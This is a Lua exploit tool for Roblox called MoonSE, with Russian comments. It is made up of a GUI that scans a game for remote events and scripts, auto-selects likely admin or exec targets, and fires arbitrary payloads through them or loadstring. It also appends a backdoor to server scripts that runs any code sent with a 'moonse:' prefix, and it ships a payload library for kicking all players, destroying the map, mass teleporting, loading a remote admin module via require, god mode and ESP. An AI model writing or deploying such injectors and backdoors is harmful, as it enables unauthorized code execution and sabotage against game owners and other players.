-- MoonSE v4.2 – Улучшенный инжектор с библиотекой и авто-выбором
-- Чёрно-белый ретро-стиль, работающий скроллинг и перетаскивание

local gui = Instance.new("ScreenGui")
gui.Name = "MoonSE"
gui.Parent = game:GetService("CoreGui") or game:GetService("PlayerGui")
gui.ResetOnSpawn = false

-- ===== АДАПТИВНЫЙ РАЗМЕР =====
local viewport = workspace.CurrentCamera.ViewportSize
local scale = math.min(1, (viewport.X + viewport.Y) / 1200)
local winW = math.min(520, viewport.X * 0.85)
local winH = math.min(520, viewport.Y * 0.85)

-- ===== ОСНОВНОЕ ОКНО =====
local main = Instance.new("Frame")
main.Size = UDim2.new(0, winW, 0, winH)
main.Position = UDim2.new(0.5, -winW/2, 0.5, -winH/2)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
main.BorderSizePixel = 2
main.BorderColor3 = Color3.fromRGB(255, 255, 255)
main.Parent = gui
main.Active = true

-- ===== ЗАГОЛОВОК =====
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 32 * scale)
title.Position = UDim2.new(0, 0, 0, 0)
title.Text = "≡ MoonSE v4.2 ≡"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 18 * scale
title.Font = Enum.Font.SourceSans
title.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
title.BorderSizePixel = 1
title.BorderColor3 = Color3.fromRGB(255, 255, 255)
title.Parent = main

-- ===== КНОПКА СВЕРТЫВАНИЯ =====
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 30 * scale, 1, -4 * scale)
minBtn.Position = UDim2.new(1, -34 * scale, 0, 2 * scale)
minBtn.Text = "−"
minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minBtn.TextSize = 20 * scale
minBtn.Font = Enum.Font.SourceSans
minBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
minBtn.BorderSizePixel = 1
minBtn.BorderColor3 = Color3.fromRGB(255, 255, 255)
minBtn.Parent = title

-- ===== ИКОНКА =====
local icon = Instance.new("TextButton")
icon.Size = UDim2.new(0, 48 * scale, 0, 48 * scale)
icon.Position = UDim2.new(1, -58 * scale, 0, 10 * scale)
icon.Text = "M"
icon.TextColor3 = Color3.fromRGB(255, 255, 255)
icon.TextSize = 28 * scale
icon.Font = Enum.Font.SourceSans
icon.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
icon.BorderSizePixel = 2
icon.BorderColor3 = Color3.fromRGB(255, 255, 255)
icon.Visible = false
icon.Parent = gui

-- ===== ПЕРЕМЕННЫЕ =====
local isMinimized = false
local isDragging = false
local dragStart = Vector2.new()
local dragOffset = Vector2.new()
local selectedRemote = nil
local selectedScript = nil
local allRemotes = {}
local allScripts = {}
local mode = "REMOTE"

-- ===== ПЕРЕТАСКИВАНИЕ =====
title.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        dragOffset = Vector2.new(main.Position.X.Offset, main.Position.Y.Offset)
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(0, dragOffset.X + delta.X, 0, dragOffset.Y + delta.Y)
    end
end)

game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- ===== СВЕРТЫВАНИЕ =====
local function minimize()
    isMinimized = true
    main.Visible = false
    icon.Visible = true
end
local function restore()
    isMinimized = false
    main.Visible = true
    icon.Visible = false
end
minBtn.MouseButton1Click:Connect(minimize)
icon.MouseButton1Click:Connect(restore)

-- ===== РАЗДЕЛИТЕЛЬ =====
local line = Instance.new("Frame")
line.Size = UDim2.new(1, -10 * scale, 0, 1)
line.Position = UDim2.new(0, 5 * scale, 0, 38 * scale)
line.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
line.BorderSizePixel = 0
line.Parent = main

-- ===== ВЫБОР РЕЖИМА =====
local modeFrame = Instance.new("Frame")
modeFrame.Size = UDim2.new(1, -10 * scale, 0, 28 * scale)
modeFrame.Position = UDim2.new(0, 5 * scale, 0, 44 * scale)
modeFrame.BackgroundTransparency = 1
modeFrame.Parent = main

local remoteModeBtn = Instance.new("TextButton")
remoteModeBtn.Size = UDim2.new(0, 120 * scale, 1, 0)
remoteModeBtn.Position = UDim2.new(0, 0, 0, 0)
remoteModeBtn.Text = "REMOTE"
remoteModeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
remoteModeBtn.TextSize = 13 * scale
remoteModeBtn.Font = Enum.Font.SourceSans
remoteModeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
remoteModeBtn.BorderSizePixel = 1
remoteModeBtn.BorderColor3 = Color3.fromRGB(0, 0, 0)
remoteModeBtn.Parent = modeFrame

local injectModeBtn = Instance.new("TextButton")
injectModeBtn.Size = UDim2.new(0, 120 * scale, 1, 0)
injectModeBtn.Position = UDim2.new(0, 125 * scale, 0, 0)
injectModeBtn.Text = "INJECT"
injectModeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
injectModeBtn.TextSize = 13 * scale
injectModeBtn.Font = Enum.Font.SourceSans
injectModeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
injectModeBtn.BorderSizePixel = 1
injectModeBtn.BorderColor3 = Color3.fromRGB(255, 255, 255)
injectModeBtn.Parent = modeFrame

local modeStatus = Instance.new("TextLabel")
modeStatus.Size = UDim2.new(0, 150 * scale, 1, 0)
modeStatus.Position = UDim2.new(0, 250 * scale, 0, 0)
modeStatus.Text = "REMOTE MODE"
modeStatus.TextColor3 = Color3.fromRGB(200, 200, 200)
modeStatus.TextSize = 12 * scale
modeStatus.Font = Enum.Font.SourceSans
modeStatus.TextXAlignment = Enum.TextXAlignment.Left
modeStatus.BackgroundTransparency = 1
modeStatus.Parent = modeFrame

-- ===== СПИСОК =====
local list = Instance.new("ScrollingFrame")
list.Size = UDim2.new(1, -10 * scale, 0, 110 * scale)
list.Position = UDim2.new(0, 5 * scale, 0, 78 * scale)
list.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
list.BorderSizePixel = 1
list.BorderColor3 = Color3.fromRGB(255, 255, 255)
list.AutomaticCanvasSize = Enum.AutomaticSize.Y
list.CanvasSize = UDim2.new(0, 0, 0, 0)
list.ScrollBarThickness = 6 * scale
list.Parent = main

local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 2 * scale)
listLayout.Parent = list

-- ===== ЛОГ =====
local logBox = Instance.new("ScrollingFrame")
logBox.Size = UDim2.new(1, -10 * scale, 0, 55 * scale)
logBox.Position = UDim2.new(0, 5 * scale, 0, 195 * scale)
logBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
logBox.BorderSizePixel = 1
logBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
logBox.AutomaticCanvasSize = Enum.AutomaticSize.Y
logBox.CanvasSize = UDim2.new(0, 0, 0, 0)
logBox.ScrollBarThickness = 6 * scale
logBox.Parent = main

local logLayout = Instance.new("UIListLayout")
logLayout.Padding = UDim.new(0, 1 * scale)
logLayout.Parent = logBox

-- ===== ПОЛЕ ВВОДА =====
local scriptBox = Instance.new("TextBox")
scriptBox.Size = UDim2.new(1, -10 * scale, 0, 50 * scale)
scriptBox.Position = UDim2.new(0, 5 * scale, 0, 256 * scale)
scriptBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
scriptBox.TextColor3 = Color3.fromRGB(255, 255, 255)
scriptBox.Text = "-- payload или код для инъекции"
scriptBox.TextWrapped = true
scriptBox.TextSize = 11 * scale
scriptBox.Font = Enum.Font.SourceSans
scriptBox.ClearTextOnFocus = false
scriptBox.BorderSizePixel = 1
scriptBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
scriptBox.Parent = main

-- ===== БИБЛИОТЕКА СКРИПТОВ (КНОПКА-МЕНЮ) =====
local libraryFrame = Instance.new("ScrollingFrame")
libraryFrame.Size = UDim2.new(1, -10 * scale, 0, 70 * scale)
libraryFrame.Position = UDim2.new(0, 5 * scale, 0, 312 * scale)
libraryFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
libraryFrame.BorderSizePixel = 1
libraryFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
libraryFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
libraryFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
libraryFrame.ScrollBarThickness = 6 * scale
libraryFrame.Visible = false
libraryFrame.Parent = main

local libraryLayout = Instance.new("UIListLayout")
libraryLayout.Padding = UDim.new(0, 2 * scale)
libraryLayout.Parent = libraryFrame

-- ===== БИБЛИОТЕКА СКРИПТОВ (ДАННЫЕ) =====
local scriptLibrary = {
    { name = "FLY (Server)", desc = "Полёт всем игрокам",
      code = [[
        for _, p in ipairs(game.Players:GetPlayers()) do
            local char = p.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local bv = Instance.new("BodyVelocity")
                bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                bv.Parent = char.HumanoidRootPart
                task.spawn(function()
                    while bv and bv.Parent do
                        bv.Velocity = Vector3.new(0, 50, 0)
                        task.wait(0.1)
                    end
                end)
            end
        end
      ]]
    },
    { name = "GIVE ADMIN (Require)", desc = "Загружает админку через require",
      code = [[
        local id = "18665717275"
        local ok, mod = pcall(require, tonumber(id))
        if ok and type(mod) == "table" and mod.load then
            mod.load("print('Admin loaded!')")
        else
            print("Module not found")
        end
      ]]
    },
    { name = "SERVER INFO", desc = "Информация о сервере",
      code = [[
        local plrs = game.Players
        local info = string.format("Players: %d/%d\nPing: %dms",
            #plrs:GetPlayers(), plrs.MaxPlayers,
            game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueInteger()
        )
        print(info)
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="Info", Text=info, Duration=5})
      ]]
    },
    { name = "KICK ALL", desc = "Кикает всех игроков",
      code = [[
        for _, p in ipairs(game.Players:GetPlayers()) do
            p:Kick("Kicked by MoonSE")
        end
      ]]
    },
    { name = "TELEPORT ALL", desc = "Телепортирует всех в центр",
      code = [[
        local pos = Vector3.new(0, 100, 0)
        for _, p in ipairs(game.Players:GetPlayers()) do
            local char = p.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.CFrame = CFrame.new(pos)
            end
        end
      ]]
    },
    { name = "DESTROY MAP", desc = "Удаляет все части в Workspace",
      code = [[
        for _, c in ipairs(game.Workspace:GetChildren()) do
            if c:IsA("Part") or c:IsA("MeshPart") then
                c:Destroy()
            end
        end
      ]]
    },
    { name = "MESSAGE ALL", desc = "Отправляет сообщение всем игрокам",
      code = [[
        local msg = "MoonSE v4.2 active!"
        for _, p in ipairs(game.Players:GetPlayers()) do
            p:Chat(msg)
        end
      ]]
    },
    { name = "GOD MODE", desc = "Делает вас неуязвимым",
      code = [[
        local plr = game.Players.LocalPlayer
        local char = plr.Character or plr.CharacterAdded:Wait()
        local hum = char:FindFirstChild("Humanoid")
        if hum then
            hum.MaxHealth = 1e9
            hum.Health = 1e9
            hum.BreakJointsOnDeath = false
        end
      ]]
    },
    { name = "ESP", desc = "Включает ESP для всех игроков",
      code = [[
        local function createESP(player)
            local char = player.Character
            if not char then return end
            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.FillTransparency = 0.5
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.Adornee = char
            highlight.Parent = char
        end
        for _, p in ipairs(game.Players:GetPlayers()) do
            if p ~= game.Players.LocalPlayer then
                createESP(p)
            end
        end
      ]]
    }
}

-- ===== БИБЛИОТЕКА СКРИПТОВ В GUI =====
local function updateLibrary()
    -- Очищаем библиотеку
    for _, c in ipairs(libraryFrame:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    for _, scriptData in ipairs(scriptLibrary) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -4 * scale, 0, 24 * scale)
        btn.Text = scriptData.name .. " — " .. scriptData.desc
        btn.TextColor3 = Color3.fromRGB(200, 200, 200)
        btn.TextSize = 10 * scale
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        btn.BorderSizePixel = 1
        btn.BorderColor3 = Color3.fromRGB(100, 100, 100)
        btn.Parent = libraryFrame
        btn.MouseButton1Click:Connect(function()
            scriptBox.Text = scriptData.code
            addLog("📚 Loaded: " .. scriptData.name, Color3.fromRGB(200, 200, 255))
        end)
    end
end

-- ===== КНОПКИ =====
local btnFrame = Instance.new("Frame")
btnFrame.Size = UDim2.new(1, -10 * scale, 0, 30 * scale)
btnFrame.Position = UDim2.new(0, 5 * scale, 0, 390 * scale)
btnFrame.BackgroundTransparency = 1
btnFrame.Parent = main

local function createBtn(text, x, w, bgColor, textColor)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, w * scale, 1, 0)
    b.Position = UDim2.new(0, x * scale, 0, 0)
    b.Text = text
    b.TextColor3 = textColor or Color3.fromRGB(255, 255, 255)
    b.TextSize = 11 * scale
    b.Font = Enum.Font.SourceSans
    b.BackgroundColor3 = bgColor or Color3.fromRGB(60, 60, 60)
    b.BorderSizePixel = 1
    b.BorderColor3 = Color3.fromRGB(255, 255, 255)
    b.Parent = btnFrame
    return b
end

local scanBtn = createBtn("SCAN", 0, 55, Color3.fromRGB(200, 200, 200), Color3.fromRGB(0,0,0))
local execBtn = createBtn("EXEC", 60, 55, Color3.fromRGB(180, 180, 180), Color3.fromRGB(0,0,0))
local autoBtn = createBtn("AUTO", 120, 55, Color3.fromRGB(160, 160, 160), Color3.fromRGB(0,0,0))
local decompileBtn = createBtn("DECOMP", 180, 65, Color3.fromRGB(140, 140, 140), Color3.fromRGB(0,0,0))
local injectBtn = createBtn("INJECT", 250, 60, Color3.fromRGB(100, 100, 100), Color3.fromRGB(255,255,255))
local libraryBtn = createBtn("LIBRARY", 315, 70, Color3.fromRGB(80, 80, 80), Color3.fromRGB(255,255,255))
local clearBtn = createBtn("CLEAR", 390, 55, Color3.fromRGB(120, 120, 120), Color3.fromRGB(0,0,0))

-- ===== СТАТУС =====
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -10 * scale, 0, 30 * scale)
status.Position = UDim2.new(0, 5 * scale, 0, 426 * scale)
status.Text = "[ READY ]"
status.TextColor3 = Color3.fromRGB(200, 200, 200)
status.TextSize = 10 * scale
status.Font = Enum.Font.SourceSans
status.TextWrapped = true
status.TextXAlignment = Enum.TextXAlignment.Left
status.BackgroundTransparency = 1
status.Parent = main

-- ===== ЛОГИРОВАНИЕ =====
local function addLog(text, color)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -4 * scale, 0, 16 * scale)
    lbl.Text = text
    lbl.TextColor3 = color or Color3.fromRGB(200, 200, 200)
    lbl.TextSize = 9 * scale
    lbl.Font = Enum.Font.SourceSans
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.BackgroundTransparency = 1
    lbl.Parent = logBox
    task.wait(0.05)
    logBox.CanvasPosition = Vector2.new(0, logBox.CanvasPosition.Y + 20 * scale)
end

-- ===== СКАНИРОВАНИЕ =====
local function scanRemotes(parent, path)
    path = path or ""
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
            table.insert(allRemotes, {
                instance = child,
                name = child.Name,
                class = child.ClassName,
                parent = parent.Name,
                fullPath = path .. "/" .. child.Name
            })
        end
        scanRemotes(child, path .. "/" .. child.Name)
    end
end

local function scanScripts(parent, path)
    path = path or ""
    for _, child in ipairs(parent:GetChildren()) do
        if child:IsA("Script") or child:IsA("LocalScript") or child:IsA("ModuleScript") then
            local src = ""
            local ok, res = pcall(function() src = child.Source end)
            table.insert(allScripts, {
                instance = child,
                name = child.Name,
                class = child.ClassName,
                parent = parent.Name,
                fullPath = path .. "/" .. child.Name,
                source = ok and src or "[ACCESS DENIED]",
                isServer = child:IsA("Script") or child:IsA("ModuleScript")
            })
        end
        scanScripts(child, path .. "/" .. child.Name)
    end
end

-- ===== ОБНОВЛЕНИЕ СПИСКА =====
local function updateList()
    for _, c in ipairs(list:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    local data = (mode == "REMOTE") and allRemotes or allScripts
    if #data == 0 then
        status.Text = "[ No items found ]"
        return
    end
    table.sort(data, function(a,b)
        local function score(item)
            local n = item.name:lower()
            local s = 0
            if n:find("admin") then s = s + 10 end
            if n:find("exec") then s = s + 8 end
            if n:find("cmd") then s = s + 6 end
            if n:find("run") then s = s + 5 end
            if n:find("load") then s = s + 5 end
            return s
        end
        return score(a) > score(b)
    end)
    for _, item in ipairs(data) do
        local btn = Instance.new("TextButton")
        local score = (function(i)
            local n = i.name:lower()
            local s = 0
            if n:find("admin") then s = s + 10 end
            if n:find("exec") then s = s + 8 end
            return s
        end)(item)
        local star = (score > 5) and "⭐ " or ""
        btn.Size = UDim2.new(1, -4 * scale, 0, 22 * scale)
        btn.Text = star .. item.name .. " (" .. item.class .. ") @" .. item.parent
        btn.TextColor3 = (score > 5) and Color3.fromRGB(255, 200, 100) or Color3.fromRGB(200, 200, 200)
        btn.TextSize = 10 * scale
        btn.TextXAlignment = Enum.TextXAlignment.Left
        btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        btn.BorderSizePixel = 1
        btn.BorderColor3 = Color3.fromRGB(100, 100, 100)
        btn.Parent = list
        btn.MouseButton1Click:Connect(function()
            if mode == "REMOTE" then
                selectedRemote = item
                status.Text = "[ SELECTED: " .. item.fullPath .. " ]"
            else
                selectedScript = item
                status.Text = "[ SELECTED: " .. item.fullPath .. " ]"
                addLog("📄 " .. item.name .. "\n" .. string.sub(item.source, 1, 150), Color3.fromRGB(200, 200, 255))
            end
            for _, b in ipairs(list:GetChildren()) do
                if b:IsA("TextButton") then b.BackgroundColor3 = Color3.fromRGB(20, 20, 20) end
            end
            btn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
        end)
    end
    status.Text = "[ Found " .. #data .. " items ]"
end

-- ===== АВТО-ВЫБОР (УМНЫЙ) =====
local function autoSelectBest()
    local data = (mode == "REMOTE") and allRemotes or allScripts
    if #data == 0 then
        status.Text = "[ No items ]"
        return
    end
    -- Сортируем по приоритету и берём первый
    table.sort(data, function(a,b)
        local function score(item)
            local n = item.name:lower()
            local s = 0
            if n:find("admin") then s = s + 10 end
            if n:find("exec") then s = s + 8 end
            if n:find("cmd") then s = s + 6 end
            if n:find("run") then s = s + 5 end
            if n:find("load") then s = s + 5 end
            if n:find("main") then s = s + 3 end
            if n:find("server") then s = s + 2 end
            return s
        end
        return score(a) > score(b)
    end)
    if mode == "REMOTE" then
        selectedRemote = data[1]
        status.Text = "[ AUTO-SELECTED: " .. selectedRemote.fullPath .. " ]"
        addLog("⭐ Auto-selected Remote: " .. selectedRemote.name, Color3.fromRGB(255, 200, 100))
    else
        -- В INJECT режиме ищем скрипты которые можно изменить (не защищённые)
        for _, s in ipairs(data) do
            if s.isServer and s.source ~= "[ACCESS DENIED]" then
                selectedScript = s
                status.Text = "[ AUTO-SELECTED: " .. s.fullPath .. " ]"
                addLog("⭐ Auto-selected Script: " .. s.name, Color3.fromRGB(255, 200, 100))
                break
            end
        end
        if not selectedScript then
            selectedScript = data[1]
            status.Text = "[ AUTO-SELECTED: " .. selectedScript.fullPath .. " ]"
        end
    end
    -- Подсветка в списке
    for _, b in ipairs(list:GetChildren()) do
        if b:IsA("TextButton") then
            b.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            if selectedRemote and b.Text:find(selectedRemote.name) then
                b.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
            elseif selectedScript and b.Text:find(selectedScript.name) then
                b.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
            end
        end
    end
end

-- ===== ВЫПОЛНЕНИЕ (REMOTE) =====
local function executeRemote(payload)
    if not selectedRemote then
        status.Text = "[ ERROR: No Remote selected ]"
        return false
    end
    local inst = selectedRemote.instance
    local ok, err = pcall(function()
        if inst:IsA("RemoteEvent") then
            inst:FireServer(payload)
        elseif inst:IsA("RemoteFunction") then
            inst:InvokeServer(payload)
        else
            error("Unsupported type")
        end
    end)
    if ok then
        addLog("✅ Executed on " .. selectedRemote.name, Color3.fromRGB(100, 255, 100))
        return true
    else
        addLog("❌ Remote error: " .. tostring(err), Color3.fromRGB(255, 100, 100))
        return false
    end
end

-- ===== ИНЪЕКЦИЯ В СКРИПТ =====
local function injectIntoScript(scriptInst, payload)
    if not scriptInst then
        status.Text = "[ ERROR: No script selected ]"
        return false
    end
    local ok, src = pcall(function() return scriptInst.Source end)
    if not ok or not src or src == "[ACCESS DENIED]" then
        addLog("❌ Cannot read script source", Color3.fromRGB(255, 100, 100))
        return false
    end
    -- Анализ назначения
    local purpose = "unknown"
    if src:lower():find("admin") then purpose = "admin"
    elseif src:lower():find("cmd") then purpose = "command"
    elseif src:lower():find("economy") then purpose = "economy"
    elseif src:lower():find("teleport") then purpose = "teleport"
    elseif src:lower():find("remote") then purpose = "remote_handler"
    elseif src:lower():find("game") then purpose = "game_logic"
    end
    addLog("🔍 Script purpose: " .. purpose, Color3.fromRGB(255, 200, 100))

    -- Бэкдор с перехватом Remote вызовов
    local backdoor = [[
        -- === MOONSE BACKDOOR v4.2 ===
        local function moonse_exec(code)
            local fn, err = loadstring(code)
            if fn then
                local ok, res = pcall(fn)
                return res
            end
            return err
        end
        -- Перехват FireServer
        local oldFire = RemoteEvent.FireServer
        RemoteEvent.FireServer = function(self, ...)
            local args = {...}
            if type(args[1]) == "string" and args[1]:sub(1,7) == "moonse:" then
                return moonse_exec(args[1]:sub(8))
            end
            return oldFire(self, ...)
        end
        -- Дополнительный скрытый обработчик
        local function heartbeat()
            -- Сторожевой таймер
        end
        game:GetService("RunService").Heartbeat:Connect(heartbeat)
        print("[[MoonSE injected]]")
    ]]
    local newSrc = src .. "\n" .. backdoor .. "\n-- " .. payload

    local ok2, err2 = pcall(function()
        scriptInst.Source = newSrc
    end)
    if ok2 then
        addLog("✅ Injected into " .. scriptInst.name, Color3.fromRGB(100, 255, 100))
        status.Text = "[ INJECTED into " .. scriptInst.name .. " ]"
        return true
    else
        addLog("❌ Injection failed: " .. tostring(err2), Color3.fromRGB(255, 100, 100))
        return false
    end
end

-- ===== ИНЖЕКТ (ОТДЕЛЬНАЯ КНОПКА) =====
local function injectCode()
    if mode ~= "INJECT" then
        status.Text = "[ Switch to INJECT mode ]"
        return
    end
    local payload = scriptBox.Text
    if payload == "" or payload == "-- payload или код для инъекции" then
        status.Text = "[ ERROR: Empty payload ]"
        return
    end
    if selectedScript then
        injectIntoScript(selectedScript.instance, payload)
    else
        -- Если не выбран конкретный скрипт, ищем самый подходящий
        local bestScript = nil
        for _, s in ipairs(allScripts) do
            if s.isServer and s.source ~= "[ACCESS DENIED]" then
                if not bestScript or (s.name:lower():find("admin") and not bestScript.name:lower():find("admin")) then
                    bestScript = s
                end
            end
        end
        if bestScript then
            selectedScript = bestScript
            injectIntoScript(bestScript.instance, payload)
            -- Подсветка в списке
            for _, b in ipairs(list:GetChildren()) do
                if b:IsA("TextButton") and b.Text:find(bestScript.name) then
                    b.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
                end
            end
        else
            status.Text = "[ ERROR: No suitable script found ]"
            addLog("❌ No suitable script for injection", Color3.fromRGB(255, 100, 100))
        end
    end
end

-- ===== ДЕКОМПИЛЯЦИЯ =====
local function decompileSelected()
    if mode ~= "INJECT" then
        status.Text = "[ Switch to INJECT mode ]"
        return
    end
    if not selectedScript then
        status.Text = "[ Select a script ]"
        return
    end
    local src = selectedScript.source
    if src == "[ACCESS DENIED]" then
        addLog("❌ Access denied to script", Color3.fromRGB(255, 100, 100))
        return
    end
    addLog("📄 DECOMPILED:\n" .. string.sub(src, 1, 400), Color3.fromRGB(200, 255, 200))
    status.Text = "[ DECOMPILED " .. selectedScript.name .. " ]"
end

-- ===== БИБЛИОТЕКА (ПОКАЗАТЬ/СКРЫТЬ) =====
local libraryVisible = false
local function toggleLibrary()
    libraryVisible = not libraryVisible
    libraryFrame.Visible = libraryVisible
    if libraryVisible then
        libraryBtn.Text = "LIBRARY ▲"
        updateLibrary()
    else
        libraryBtn.Text = "LIBRARY ▼"
    end
end

-- ===== ГЛАВНАЯ ФУНКЦИЯ ВЫПОЛНЕНИЯ (EXEC) =====
local function executeMain()
    local payload = scriptBox.Text
    if payload == "" or payload == "-- payload или код для инъекции" then
        status.Text = "[ ERROR: Empty payload ]"
        return
    end
    if mode == "REMOTE" then
        local ok = executeRemote(payload)
        if not ok then
            local ok2, err2 = pcall(function()
                local fn = loadstring(payload)
                if fn then return fn() end
                error("loadstring failed")
            end)
            if ok2 then
                addLog("✅ Executed as loadstring (client)", Color3.fromRGB(100, 255, 100))
                status.Text = "[ EXECUTED as loadstring ]"
            else
                addLog("❌ loadstring error: " .. tostring(err2), Color3.fromRGB(255, 100, 100))
            end
        end
    else
        -- В INJECT режиме EXEC работает как обычно, INJECT для внедрения
        injectCode()
    end
end

-- ===== КНОПКИ =====
scanBtn.MouseButton1Click:Connect(function()
    allRemotes = {}
    allScripts = {}
    status.Text = "[ SCANNING... ]"
    addLog("🔍 Scanning...", Color3.fromRGB(200, 200, 255))
    task.wait(0.1)
    scanRemotes(game, "")
    scanScripts(game, "")
    updateList()
    addLog("✅ Found " .. #allRemotes .. " Remotes, " .. #allScripts .. " Scripts", Color3.fromRGB(100, 255, 100))
end)

execBtn.MouseButton1Click:Connect(executeMain)

autoBtn.MouseButton1Click:Connect(function()
    autoSelectBest()
end)

decompileBtn.MouseButton1Click:Connect(decompileSelected)

injectBtn.MouseButton1Click:Connect(injectCode)

libraryBtn.MouseButton1Click:Connect(toggleLibrary)

clearBtn.MouseButton1Click:Connect(function()
    for _, c in ipairs(list:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    for _, c in ipairs(logBox:GetChildren()) do
        if c:IsA("TextLabel") then c:Destroy() end
    end
    for _, c in ipairs(libraryFrame:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    allRemotes = {}
    allScripts = {}
    selectedRemote = nil
    selectedScript = nil
    scriptBox.Text = "-- payload или код для инъекции"
    status.Text = "[ CLEARED ]"
end)

-- ===== ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ =====
remoteModeBtn.MouseButton1Click:Connect(function()
    mode = "REMOTE"
    remoteModeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    remoteModeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    injectModeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    injectModeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    modeStatus.Text = "REMOTE MODE"
    updateList()
end)

injectModeBtn.MouseButton1Click:Connect(function()
    mode = "INJECT"
    injectModeBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    injectModeBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
    remoteModeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    remoteModeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    modeStatus.Text = "INJECT MODE"
    updateList()
end)

-- ===== АВТОЗАПУСК =====
task.wait(0.5)
scanRemotes(game, "")
scanScripts(game, "")
updateList()
task.wait(0.3)
autoSelectBest()
addLog("🟢 MoonSE v4.2 ready", Color3.fromRGB(0, 255, 0))